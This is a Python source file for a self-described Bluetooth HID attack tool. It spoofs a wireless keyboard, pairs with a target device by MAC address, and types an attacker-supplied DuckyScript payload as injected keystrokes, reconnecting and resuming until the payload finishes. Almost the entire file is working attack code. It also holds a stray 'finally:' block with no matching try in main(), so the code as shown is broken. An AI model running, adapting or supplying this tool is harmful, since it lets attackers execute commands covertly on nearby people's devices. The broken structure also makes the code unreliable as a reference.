import binascii
import bluetooth
import sys
import time
import datetime
import logging
import argparse
from multiprocessing import Process
from pydbus import SystemBus
from enum import Enum
import subprocess
import os

# Assuming these utils are in a 'utils' directory relative to the script
from utils.menu_functions import ( read_duckyscript, run, restart_bluetooth_daemon)
from utils.register_device import register_hid_profile, agent_loop

child_processes = []

# ANSI escape sequences for color
class AnsiColorCode:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# Used to add a new log level between INFO and WARNING
NOTICE_LEVEL = 25

# Custom formatter class that adds color for the NOTICE log level
class ColorLogFormatter(logging.Formatter):
    COLOR_MAP = {
        logging.DEBUG: AnsiColorCode.BLUE,
        logging.INFO: AnsiColorCode.GREEN,
        logging.WARNING: AnsiColorCode.YELLOW,
        logging.ERROR: AnsiColorCode.RED,
        logging.CRITICAL: AnsiColorCode.RED,
        NOTICE_LEVEL: AnsiColorCode.BLUE,  # Color for NOTICE level
    }

    def format(self, record):
        color = self.COLOR_MAP.get(record.levelno, AnsiColorCode.WHITE)
        message = super().format(record)
        return f'{color}{message}{AnsiColorCode.RESET}'

# Add the custom 'notice' method to the Logger class
def notice(self, message, *args, **kwargs):
    if self.isEnabledFor(NOTICE_LEVEL):
        self._log(NOTICE_LEVEL, message, args, **kwargs)

# Add the custom log level and method to the logging module
logging.addLevelName(NOTICE_LEVEL, "NOTICE")
logging.Logger.notice = notice

# Configure logging with the color formatter and custom level
def setup_logging():
    log_format = "%(asctime)s - %(levelname)s - %(message)s"
    formatter = ColorLogFormatter(log_format)
    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logging.basicConfig(level=logging.INFO, handlers=[handler])

# Define a global logger for all modules to use
setup_logging()
log = logging.getLogger(__name__)


class ConnectionFailureException(Exception):
    pass

class Adapter:
    def __init__(self, iface):
        self.iface = iface
        self.bus = SystemBus()
        self.adapter = self._get_adapter(iface)

    def _get_adapter(self, iface):
        try:
            return self.bus.get("org.bluez", f"/org/bluez/{iface}")
        except KeyError:
            log.error(f"Unable to find adapter '{self.iface}', aborting.")
            raise ConnectionFailureException("Adapter not found")

    def _run_command(self, command):
        result = run(command)
        if result.returncode != 0:
            raise ConnectionFailureException(f"Failed to execute command: {' '.join(command)}. Error: {result.stderr}")

    def set_property(self, prop, value):
        value_str = str(value) if not isinstance(value, str) else value
        command = ["sudo", "hciconfig", self.iface, prop, value_str]
        self._run_command(command)
        
        # Verify the property was set correctly
        verify_command = ["hciconfig", self.iface, prop]
        verification_result = run(verify_command)
        if value_str not in verification_result.stdout:
            log.error(f"Unable to set adapter {prop}, aborting. Output: {verification_result.stdout}")
            raise ConnectionFailureException(f"Failed to set {prop}")

    def power(self, powered):
        self.adapter.Powered = powered

    def reset(self):
        self.power(False)
        time.sleep(0.5)
        self.power(True)
        time.sleep(0.5)

    def enable_ssp(self):
        try:
            # Enable Secure Simple Pairing (SSP)
            ssp_command = ["sudo", "hciconfig", self.iface, "sspmode", "1"]
            ssp_result = run(ssp_command)
            if ssp_result.returncode != 0:
                log.error(f"Failed to enable SSP: {ssp_result.stderr}")
                raise ConnectionFailureException("Failed to enable SSP")
            log.info("Secure Simple Pairing (SSP) enabled.")
        except Exception as e:
            log.error(f"Error enabling SSP: {e}")
            raise

class PairingAgent:
    def __init__(self, iface, target_addr):
        self.iface = iface
        self.target_addr = target_addr
        dev_name = f"dev_{target_addr.upper().replace(':', '_')}"
        self.target_path = f"/org/bluez/{iface}/{dev_name}"
        self.agent = None

    def __enter__(self):
        try:
            log.debug("Starting agent process...")
            self.agent = Process(target=agent_loop, args=(self.target_path,))
            self.agent.start()
            child_processes.append(self.agent)
            time.sleep(0.5)
            log.debug("Agent process started.")
            return self
        except Exception as e:
            log.error(f"Error starting agent process: {e}")
            raise

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.agent and self.agent.is_alive():
            try:
                log.debug("Terminating agent process...")
                self.agent.kill()
                self.agent.join(timeout=2)
                log.debug("Agent process terminated.")
            except Exception as e:
                log.error(f"Error terminating agent process: {e}")

class L2CAPConnectionManager:
    def __init__(self, target_address):
        self.target_address = target_address
        self.clients = {}

    def create_connection(self, port):
        client = L2CAPClient(self.target_address, port)
        self.clients[port] = client
        return client

    def connect_all(self):
        try:
            # Connect all clients and check if all connections were successful
            return all(client.connect() for client in self.clients.values())
        except ConnectionFailureException as e:
            log.error(f"Connection failure: {e}")
            raise

    def close_all(self):
        for client in self.clients.values():
            client.close()

# Exception for handling the reconnection process
class ReconnectionRequiredException(Exception):
    def __init__(self, message, current_line=0, current_position=0):
        super().__init__(message)
        time.sleep(2)
        self.current_line = current_line
        self.current_position = current_position

class L2CAPClient:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.connected = False
        self.sock = None

    @staticmethod
    def encode_keyboard_input(*args):
        keycodes = []
        flags = 0
        for a in args:
            if isinstance(a, Key_Codes):
                keycodes.append(a.value)
            elif isinstance(a, Modifier_Codes):
                flags |= a.value
        
        # Ensure there are always 6 keycodes, padding with zeros
        keycodes += [0] * (6 - len(keycodes))
        # HID report format: [Report ID, Modifier, 0x00, Key 1, Key 2, ..., Key 6]
        report = bytes([0xa1, 0x01, flags, 0x00] + keycodes)
        return report

    def close(self):
        if self.connected and self.sock:
            self.sock.close()
        self.connected = False
        self.sock = None

    def reconnect(self):
        # Notify the caller that a reconnection is required
        raise ReconnectionRequiredException("Reconnection required")

    def send(self, data):
        if not self.connected:
            log.error("[TX] Not connected, attempting to reconnect.")
            self.reconnect()

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        log.debug(f"[{timestamp}][TX-{self.port}] Sending data: {binascii.hexlify(data).decode()}")
        
        try:
            self.sock.send(data)
            log.debug(f"[TX-{self.port}] Data sent successfully.")
        except bluetooth.btcommon.BluetoothError as ex:
            log.error(f"[TX-{self.port}] Bluetooth error during send: {ex}")
            self.reconnect() # Trigger reconnection and let the main loop handle it

    def recv(self, timeout=0.1):
        if not self.connected or not self.sock:
            return None
        
        start = time.time()
        while (time.time() - start) < timeout:
            try:
                raw = self.sock.recv(64)
                if len(raw) == 0:
                    self.connected = False
                    return None
                log.debug(f"[RX-{self.port}] Received data: {binascii.hexlify(raw).decode()}")
                return raw
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11: # 11 is 'Resource temporarily unavailable'
                    raise
                time.sleep(0.01) # Wait briefly before retrying
        return None # Timeout reached

    def connect(self, timeout=10.0):
        log.info(f"Connecting to {self.addr} on port {self.port}...")
        try:
            self.sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            self.sock.settimeout(timeout)
            self.sock.connect((self.addr, self.port))
            self.sock.setblocking(0)
            self.connected = True
            log.info(f"{AnsiColorCode.GREEN}SUCCESS! Connected to {self.addr} on port {self.port}{AnsiColorCode.RESET}")
            return True
        except Exception as ex:
            log.error(f"ERROR connecting on port {self.port}: {ex}")
            self.connected = False
            # The exception will be caught by connect_all to stop the process
            raise ConnectionFailureException(f"Connection failure on port {self.port}")

    def send_keypress(self, *args, delay=0.01):
        if args:
            log.debug(f"Sending keypress: {args}")
            # Press key(s)
            self.send(self.encode_keyboard_input(*args))
            time.sleep(delay)
        
        # Release all keys
        self.send(self.encode_keyboard_input())
        time.sleep(delay)

def process_duckyscript(client, duckyscript, current_line=0, current_position=0):
    client.send_keypress()  # Send empty report to ensure a clean start
    time.sleep(0.5)

    try:
        for line_number, line in enumerate(duckyscript):
            if line_number < current_line:
                continue  # Skip already processed lines

            line = line.strip()
            if not line or line.startswith("REM"):
                continue

            log.info(f"Processing: {line}")

            # Resume from the last position if reconnecting in the middle of a STRING
            if line_number == current_line and current_position > 0:
                if line.startswith("STRING"):
                    line = f"STRING {line[7 + current_position:]}"
                else:
                    current_position = 0 # Not a string, so process the whole line
            
            command = line.split(" ", 1)
            cmd_type = command[0].upper()
            cmd_value = command[1] if len(command) > 1 else ""

            if cmd_type == "DELAY":
                try:
                    delay_time_ms = int(cmd_value)
                    time.sleep(delay_time_ms / 1000)
                except (ValueError, IndexError):
                    log.error(f"Invalid DELAY format: {line}")

            elif cmd_type == "STRING":
                for char_position, char in enumerate(cmd_value):
                    log.notice(f"Typing character: '{char}'")
                    key_map = char_to_key_code(char)
                    if key_map:
                        client.send_keypress(*key_map)
                    else:
                        log.warning(f"Unsupported character '{char}' in Duckyscript")
                    current_position = char_position + 1

            elif cmd_type in ["GUI", "WINDOWS", "COMMAND", "CTRL", "ALT", "SHIFT"]:
                try:
                    modifier = getattr(Modifier_Codes, cmd_type)
                    key = getattr(Key_Codes, cmd_value.lower())
                    client.send_keypress(modifier, key)
                except AttributeError:
                    log.warning(f"Unsupported key combination: {line}")
            
            elif cmd_type == "ENTER": client.send_keypress(Key_Codes.ENTER)
            elif cmd_type == "TAB": client.send_keypress(Key_Codes.TAB)
            elif cmd_type == "ESCAPE": client.send_keypress(Key_Codes.ESCAPE)
            elif cmd_type == "SPACE": client.send_keypress(Key_Codes.SPACE)
            elif cmd_type == "UP": client.send_keypress(Key_Codes.UP)
            elif cmd_type == "DOWN": client.send_keypress(Key_Codes.DOWN)
            elif cmd_type == "LEFT": client.send_keypress(Key_Codes.LEFT)
            elif cmd_type == "RIGHT": client.send_keypress(Key_Codes.RIGHT)

            else:
                 log.warning(f"Unknown command: {cmd_type}")

            # Successfully processed line, reset position and increment line counter
            current_position = 0
            current_line += 1

    except ReconnectionRequiredException:
        raise ReconnectionRequiredException("Reconnection required", current_line, current_position)
    except Exception as e:
        log.error(f"Error during script execution: {e}")

# Key mapping function
def char_to_key_code(char):
    shift_map = {
        '!': '1', '"': "'", '#': '3', '$': '4', '%': '5', '&': '7',
        '(': '9', ')': '0', '*': '8', '+': '=', '_': '-', '{': '[',
        '}': ']', ':': ';', '<': ',', '>': '.', '?': '/', '|': '\\',
        '@': '2', '^': '6', '~': '`'
    }

    key_codes = {
        'a': Key_Codes.a, 'b': Key_Codes.b, 'c': Key_Codes.c, 'd': Key_Codes.d, 'e': Key_Codes.e,
        'f': Key_Codes.f, 'g': Key_Codes.g, 'h': Key_Codes.h, 'i': Key_Codes.i, 'j': Key_Codes.j,
        'k': Key_Codes.k, 'l': Key_Codes.l, 'm': Key_Codes.m, 'n': Key_Codes.n, 'o': Key_Codes.o,
        'p': Key_Codes.p, 'q': Key_Codes.q, 'r': Key_Codes.r, 's': Key_Codes.s, 't': Key_Codes.t,
        'u': Key_Codes.u, 'v': Key_Codes.v, 'w': Key_Codes.w, 'x': Key_Codes.x, 'y': Key_Codes.y,
        'z': Key_Codes.z,
        '1': Key_Codes._1, '2': Key_Codes._2, '3': Key_Codes._3, '4': Key_Codes._4, '5': Key_Codes._5,
        '6': Key_Codes._6, '7': Key_Codes._7, '8': Key_Codes._8, '9': Key_Codes._9, '0': Key_Codes._0,
        ' ': Key_Codes.SPACE, '-': Key_Codes.MINUS, '=': Key_Codes.EQUAL, '[': Key_Codes.LEFTBRACE,
        ']': Key_Codes.RIGHTBRACE, '\\': Key_Codes.BACKSLASH, ';': Key_Codes.SEMICOLON,
        "'": Key_Codes.QUOTE, '`': Key_Codes.GRAVE, ',': Key_Codes.COMMA, '.': Key_Codes.DOT,
        '/': Key_Codes.SLASH
    }

    if char.islower() or char.isdigit() or char in " -=[]\\;',.`/":
        return (key_codes[char],)
    if char.isupper():
        return (Modifier_Codes.SHIFT, key_codes[char.lower()])
    if char in shift_map:
        return (Modifier_Codes.SHIFT, key_codes[shift_map[char]])
    return None

class Modifier_Codes(Enum):
    CTRL = 0x01; RIGHTCTRL = 0x10
    SHIFT = 0x02; RIGHTSHIFT = 0x20
    ALT = 0x04; RIGHTALT = 0x40
    GUI = 0x08; RIGHTGUI = 0x80
    WINDOWS = 0x08; COMMAND = 0x08

class Key_Codes(Enum):
    NONE=0x00; a=0x04; b=0x05; c=0x06; d=0x07; e=0x08; f=0x09; g=0x0a; h=0x0b; i=0x0c;
    j=0x0d; k=0x0e; l=0x0f; m=0x10; n=0x11; o=0x12; p=0x13; q=0x14; r=0x15; s=0x16;
    t=0x17; u=0x18; v=0x19; w=0x1a; x=0x1b; y=0x1c; z=0x1d; _1=0x1e; _2=0x1f; _3=0x20;
    _4=0x21; _5=0x22; _6=0x23; _7=0x24; _8=0x25; _9=0x26; _0=0x27; ENTER=0x28; ESCAPE=0x29;
    BACKSPACE=0x2a; TAB=0x2b; SPACE=0x2c; MINUS=0x2d; EQUAL=0x2e; LEFTBRACE=0x2f;
    RIGHTBRACE=0x30; BACKSLASH=0x31; SEMICOLON=0x33; QUOTE=0x34; GRAVE=0x35; COMMA=0x36;
    DOT=0x37; SLASH=0x38; CAPSLOCK=0x39; RIGHT=0x4f; LEFT=0x50; DOWN=0x51; UP=0x52;

def terminate_child_processes():
    log.info("Terminating all child processes...")
    for proc in child_processes:
        if proc.is_alive():
            proc.terminate()
            proc.join(timeout=2)

def setup_bluetooth(target_address, adapter_id):
    restart_bluetooth_daemon()
    profile_proc = Process(target=register_hid_profile, args=(adapter_id, target_address))
    profile_proc.start()
    child_processes.append(profile_proc)
    
    adapter = Adapter(adapter_id)
    adapter.set_property("name", "Wireless Keyboard") # Use a common name
    adapter.set_property("class", 0x002540) # HID Keyboard class
    adapter.power(True)
    return adapter

def initialize_pairing(agent_iface, target_address):
    # The PairingAgent is now managed with a 'with' statement in the main loop
    # to ensure it is started and stopped correctly around connection attempts.
    pass

def setup_and_connect(connection_manager, target_address, adapter_id):
    connection_manager.create_connection(1)   # SDP
    connection_manager.create_connection(17)  # HID Control
    connection_manager.create_connection(19)  # HID Interrupt
    
    with PairingAgent(adapter_id, target_address):
        if not connection_manager.connect_all():
            raise ConnectionFailureException("Failed to connect to all required ports")
    
    return connection_manager.clients[19] # Return the main client for sending data

def troubleshoot_bluetooth():
    log.info("Running Bluetooth diagnostics...")
    try:
        # Check if bluetoothctl is available
        subprocess.run(['bluetoothctl', '--version'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Check for Bluetooth adapters
        result = subprocess.run(['bluetoothctl', 'list'], check=True, capture_output=True, text=True)
        if "Controller" not in result.stdout:
            log.critical(f"No {AnsiColorCode.BLUE}Bluetooth adapters{AnsiColorCode.RESET} were detected.")
            return False
    except (subprocess.CalledProcessError, FileNotFoundError):
        log.critical(f"{AnsiColorCode.BLUE}bluetoothctl{AnsiColorCode.RESET} is not installed or not in PATH.")
        return False
    
    log.info("Bluetooth diagnostics passed.")
    return True

def parse_args():
    parser = argparse.ArgumentParser(description="Bluetooth HID Attack Tool")
    parser.add_argument('--adapter', type=str, default='hci0', help='Specify the Bluetooth adapter to use (default: hci0)')
    parser.add_argument('--target', type=str, required=True, help='Target device MAC address')
    parser.add_argument('--payload', type=str, required=True, help='Path to DuckyScript payload file')
    return parser.parse_args()

def main():
    args = parse_args()
    
    # Run a pre-flight check
    if not troubleshoot_bluetooth():
        sys.exit(1)

    adapter_id = args.adapter
    target_address = args.target
    
    # The interactive menu is removed to prevent conflict with command-line arguments.
    # main_menu() 
    
    if not os.path.exists(args.payload):
        log.error(f"Payload file not found: {args.payload}")
        return
        
    duckyscript = read_duckyscript(args.payload)
    if not duckyscript:
        log.error("Payload file is empty or could not be read.")
        return

    try:
        adapter = setup_bluetooth(target_address, adapter_id)
        adapter.enable_ssp()
    except ConnectionFailureException as e:
        log.critical(f"Failed to set up Bluetooth adapter: {e}")
        return

    current_line = 0
    current_position = 0
    
    while True: # Main loop for connection and execution
        connection_manager = L2CAPConnectionManager(target_address)
        try:
            hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
            log.info("Connection established. Executing payload...")
            process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
            log.info(f"{AnsiColorCode.GREEN}Payload execution finished successfully.{AnsiColorCode.RESET}")
            break  # Exit loop if successful

        except ReconnectionRequiredException as e:
            log.info(f"{AnsiColorCode.YELLOW}Reconnection required. Retrying...{AnsiColorCode.RESET}")
            current_line = e.current_line
            current_position = e.current_position
            connection_manager.close_all()
            time.sleep(3) # Wait before retrying

        except ConnectionFailureException as e:
            log.error(f"Could not establish connection: {e}. Retrying in 5 seconds...")
            connection_manager.close_all()
            time.sleep(5)
        
        except Exception as e:
            log.critical(f"An unexpected error occurred: {e}")
            break
        
        finally:
            connection_manager.close_all()
            
    # Final cleanup after the loop is broken or an unhandled exception occurs
    finally:
        # Unpair the target device
        log.info(f"Removing device: {target_address}")
        command = f'echo -e "remove {target_address}\n" | bluetoothctl'
        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        log.info(f"{AnsiColorCode.BLUE}Successfully removed device: {target_address}{AnsiColorCode.RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.info("\nProcess interrupted by user.")
    finally:
        terminate_child_processes()
        log.info("Cleanup complete. Exiting.")